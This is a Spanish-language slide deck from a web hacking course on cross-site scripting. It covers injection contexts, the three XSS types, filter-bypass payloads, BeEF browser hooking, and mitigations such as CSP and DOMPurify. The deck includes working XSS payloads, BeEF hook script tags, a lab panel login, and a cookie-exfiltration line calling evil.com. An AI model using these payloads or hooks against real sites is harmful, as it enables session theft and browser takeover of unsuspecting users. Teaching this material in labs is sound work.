# Deck — Clase 3 · Módulo 2

> Curso de Web Hacking
> Duración: ~1 hora (primera parte de Clase 4)
> Formato: teoría + demos guiadas

---

# Web Hacking
## Módulo 2 — Clase 3
### XSS Profundo, Bypass y BeEF

---

## Recap breve: Clase 2

- Burp Suite: interceptar, modificar y repetir requests
- SQL Injection: datos mezclados con consultas
- UNION SELECT para extraer datos de otras tablas
- Blind SQLi: boolean-based y time-based
- Automatización con Intruder
- La idea clave: **entender el contexto donde se interpreta el dato**

---

## Agenda de hoy

| Bloque | Contenido | Tiempo aprox. |
|---|---|---|
| **1** | XSS: contextos, tipos (Reflected/Stored/DOM) y comparativa | ~18 min |
| **2** | Bypass de filtros y payloads | ~7 min |
| 🧪 | Demo 1: DOM XSS en WebGoat | ~15 min |
| **3** | BeEF: control del navegador post-XSS | ~5 min |
| 🧪 | Demo 2: BeEF hook en XSS | ~10 min |
| 🏁 | Impacto real y mitigaciones | ~5 min |

---

## XSS: ¿Qué es Cross-Site Scripting?

XSS es un fallo de **separación de contextos**.

El navegador no distingue entre:

1. **Datos legítimos**
2. **Código ejecutable**

Cuando esa distinción falla, el navegador ejecuta instrucciones que nunca debieron estar ahí.

**Por qué sigue en el OWASP Top 10:**
- Afecta al **lado cliente** — muchos devs solo protegen el servidor
- DOM XSS no pasa por el backend → escapa a validaciones server-side
- El impacto real va mucho más allá de un `alert()`

---

## Contextos de ejecución

No todo payload funciona en todos los lugares. El navegador interpreta distinto según dónde caiga el input:

| Contexto | Ejemplo vulnerable | Payload |
|---|---|---|
| **HTML** | `<p>Hola INPUT</p>` | `<script>alert(1)</script>` |
| **Atributo** | `<img src="INPUT">` | `" onerror="alert(1)` |
| **JavaScript** | `var x = 'INPUT';` | `';alert(1);//` |
| **URL/href** | `<a href="INPUT">` | `javascript:alert(1)` |

La regla: **identificar el contexto antes de armar el payload**.

---

## XSS Reflejado (Reflected XSS)

El payload:
1. Sale del navegador (en la URL o body)
2. Llega al servidor
3. Vuelve inmediatamente en la respuesta sin sanitizar

**Cómo detectarlo:** inyectar un string único de prueba (canary, ej. `xss123test`), ver dónde se refleja en la respuesta y usar eso para determinar el contexto antes de armar el payload final.

Típico en: buscadores internos, mensajes de error, parámetros GET/POST reflejados.

Ejemplo clásico:

```
https://sitio.com/buscar?q=<script>alert('XSS')</script>
```

Si el input cae dentro de un atributo HTML hay que romper el atributo primero:

```html
"><script>alert('XSS')</script>
```

---

## XSS Persistente (Stored XSS)

El payload se **almacena** en el servidor (DB, archivo, log) y se ejecuta cada vez que alguien accede al contenido.

Aparece en:
- Comentarios y foros
- Perfiles de usuario
- Mensajes privados
- Paneles de administración (logs)
- Campos que se renderizan en otros contextos

Impacto: afecta a **múltiples víctimas** sin que el atacante intervenga de nuevo.

---

## XSS basado en DOM (DOM XSS)

La vulnerabilidad está en el JavaScript del **cliente**. El servidor puede comportarse correctamente.

El modelo mental:

```
SOURCE (de dónde viene el dato) → SINK (dónde se ejecuta)
```

Sources comunes:
- `location.hash`, `location.search`
- `document.URL`, `document.referrer`
- `window.name`, `postMessage`

Sinks peligrosos:
- `innerHTML`, `outerHTML`
- `document.write()`
- `eval()`, `setTimeout(string)`, `Function()`
- `element.src`, `element.href`

---

## DOM XSS: ejemplo concreto

Código vulnerable:

```javascript
// Source: location.hash (fragmento de URL después del #)
var input = document.location.hash.substring(1);
// Sink: innerHTML (inserción directa en el DOM)
document.getElementById('output').innerHTML = input;
```

Explotación:

```
http://target/page#<img src=x onerror=alert(document.cookie)>
```

El servidor nunca ve el payload (está después del `#`). Solo el navegador lo procesa.

---

## Comparativa de tipos

| Pregunta | Reflected | Stored | DOM |
|---|---|---|---|
| ¿Pasa por servidor? | Sí | Sí (se guarda) | No necesariamente |
| ¿Dónde está la falla? | Renderizado server-side | Almacenamiento + renderizado | JavaScript del cliente |
| ¿Cómo lo investigás? | Request/response | Buscar dónde se almacena | DevTools + sources + DOM |
| ¿Cómo se arregla? | Escape server-side | Escape server-side + sanitizar antes de guardar | Sanitizar en el JS del cliente |
| ¿Persistente? | No | Sí | Depende del source |
| ¿Víctimas? | 1 por click | Todas las que accedan | 1 por click (generalmente) |

---

## Bypass de filtros

Muchos filtros fallan porque hacen blacklist de patrones obvios: bloquean `<script>` pero no otros vectores de ejecución.

```html
<!-- Sin <script>: event handlers en HTML5 -->
<img src=x onerror=alert(1)>

<!-- SVG inline -->
<svg onload=alert(1)>

<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding: HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```

La seguridad por blacklist es frágil: el navegador tiene **muchas formas válidas** de ejecutar código. Existen scanners automatizados (ej. `dalfox`) para encontrar XSS a mayor escala — se profundiza en Módulo 3.

---

## 🧪 Demo guiada 1 — DOM XSS en WebGoat

**Target:** `Cross Site Scripting → Identify potential for DOM-Based XSS` (pantalla 10-11)

Pasos:
1. Abrir DevTools → Sources
2. Revisar el JavaScript que procesa la URL
3. Identificar el **source** (¿qué parte de la URL se lee?)
4. Identificar el **sink** (¿dónde se inserta?)
5. Modificar la URL con un texto de prueba
6. Construir payload DOM XSS:

```
http://target/WebGoat/start.mvc#test/<script>alert('DOM-XSS')</script>
```

---

## BeEF Framework: control del navegador

Si logramos ejecutar JavaScript arbitrario, el navegador se convierte en una **plataforma de control remoto**.

**BeEF (Browser Exploitation Framework)** demuestra post-explotación tras XSS exitoso: captura de credenciales, keylogging, reconocimiento de red interna, pivoteo hacia otras máquinas e ingeniería social (fake login, fake update).

**Cómo funciona:**
1. El atacante inyecta un **hook** (script JS que conecta al panel BeEF):

```html
<script src="http://attacker:3000/hook.js"></script>
```

2. La víctima ejecuta el hook (vía XSS) y su navegador se conecta al panel de BeEF
3. El atacante ejecuta módulos desde el panel: obtener cookies, capturar formularios, escanear red interna, social engineering

---

## 🧪 Demo guiada 2 — BeEF hook en XSS

**Setup:**

BeEF ya está corriendo en el lab — no hace falta levantarlo:
- Panel: https://beef.labs.manuel-roldan.cloud/ui/panel (usuario: beef / password: cursohacking2026)
- Hook: https://beef.labs.manuel-roldan.cloud/hook.js

**Target:** sitio vulnerable a XSS (WebGoat o DVWA)

**Pasos:**
1. Inyectar payload con hook de BeEF:

```html
<script src="https://beef.labs.manuel-roldan.cloud/hook.js"></script>
```

2. Ver cómo el navegador se conecta al panel BeEF
3. Ejecutar módulos: obtener cookies, alert falso, redirect
4. Mostrar el impacto más allá del `alert(1)`

---

## Impacto real de XSS

BeEF rompe dos ideas ingenuas sobre XSS:
1. *"Fue solo un alert, no pasa nada"* → se puede escalar a robo de sesión completo
2. *"Si no toqué el servidor, el impacto es bajo"* → el navegador es un entorno de ejecución con capacidades poderosas

Con XSS no solo mostrás un `alert(1)`. Es **prueba de ejecución**, no el objetivo final. Un atacante puede:
- **Robar cookies/tokens:** `new Image().src='http://evil.com/?c='+document.cookie`
- **Capturar credenciales:** inyectar formulario falso de login
- **Keylogger, redirección y pivoteo** dentro de la red interna de la víctima
- **Ejecutar acciones como la víctima:** requests AJAX autenticados con su sesión

El verdadero impacto depende de la imaginación del atacante y los privilegios de la víctima.

---

## Mitigaciones contra XSS

| Capa | Técnica |
|---|---|
| **Output encoding** | Escapar según contexto: HTML entities, JS escape, URL encode |
| **Input validation** | Allowlists cuando el formato es predecible |
| **CSP** | `Content-Security-Policy: default-src 'self'` bloquea inline scripts |
| **HTTPOnly cookies** | Previene robo de sesión vía `document.cookie` |
| **Framework auto-escape** | React, Angular, Vue escapan por defecto (excepto `dangerouslySetInnerHTML`) |
| **DOM sanitization** | DOMPurify para contenido dinámico en el cliente |

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

---

## Resumen de lo aprendido

- XSS aparece cuando el navegador no puede distinguir datos de código
- Hay tres tipos: Reflected, Stored y DOM-based
- El **contexto** determina el payload: HTML, atributo, JS, URL
- Los filtros blacklist son fáciles de evadir con payloads alternativos
- BeEF demuestra que XSS no es "solo un alert" → control total del navegador
- CSP, HTTPOnly cookies y auto-escape son capas defensivas clave

---

## Próxima clase

**Misma Clase 4 — después de la pausa:**
- **APIs modernas:** BOLA y Mass Assignment
- **JWT:** ataques y debilidades comunes
- **File Upload vulnerabilities**
- **Metasploit:** explotación práctica

Seguimos con `Modulo-4/deck_4_1.md`.

---

## Gracias

**Preguntas, consultas y dudas:**
Durante la clase o por el canal del curso.

**Antes de la pausa:**
Repasá mentalmente contextos, tipos de XSS y bypass de filtros — volvemos en la misma clase con APIs modernas y Metasploit.

---

## Pausa — 20 minutos

Volvemos en 20 minutos. Después: APIs modernas y Metasploit.
